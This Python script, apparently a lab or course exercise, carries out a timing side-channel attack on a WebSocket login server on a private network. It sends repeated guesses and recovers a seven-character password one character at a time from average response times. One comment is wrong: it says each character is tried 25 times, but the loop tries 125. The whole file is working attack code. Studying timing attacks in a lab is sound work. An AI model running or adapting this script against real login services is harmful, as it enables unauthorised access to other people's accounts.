from socket import *
from sys import *
import asyncio
import websockets
import json
import time
from statistics import *

async def client_stub(username, password):
    server_address = "ws://192.168.1.10:3840"
    err_count = 0
    while True:
        try:
            time_before = time.perf_counter()
            async with websockets.connect(server_address) as websocket:
                await websocket.send(json.dumps([username, password]))
                reply = await websocket.recv()
            time_after = time.perf_counter()
            time_delta = time_after - time_before
            if err_count != 0:
                print(err_count)
                err_count = 0
            return json.loads(reply), time_delta
        except:
            err_count += 1
            continue

async def call_server(username, password):
    reply, time_delta = await client_stub(username, password)
    if reply[-15:] == 'Access Granted!':
        print('Correct password found: {}'.format(password))
    else:
        print('Incorrect password: {}'.format(password))
    return reply, time_delta

async def guess_password(username):
    password_length = 7
    password = ""
    characters = "abcdefghijklmnopqrstuvwxyz0123456789"

    while len(password) < password_length:
        max_average_time = float("-inf")
        next_char = None

        for char in characters:
            response_times = []

            for _ in range(125):  # Try each character 25 times
                guess = password + char + "0" * (password_length - len(password) - 1)
                time.sleep(0.001)  # Make sure to wait so as to not overload the server!
                _, response_time = await client_stub(username, guess)
                response_times.append(response_time)
                print(f"Guessing '{guess}' -> Response time: {response_time}")

            average_time = sum(response_times) / len(response_times)
            print(f"Average response time for character '{char}': {average_time}")

            if next_char is None or average_time > max_average_time:
                max_average_time = average_time
                next_char = char

        print(f"Next character to try: '{next_char}' with average time: {max_average_time}")
        password += next_char
        print(f"Password so far: {password}")

    # Call the server with the generated password
    await call_server(username, password)

    return password

async def main():
    username = "453713"  # Assuming this is your username
    await guess_password(username)

asyncio.run(main())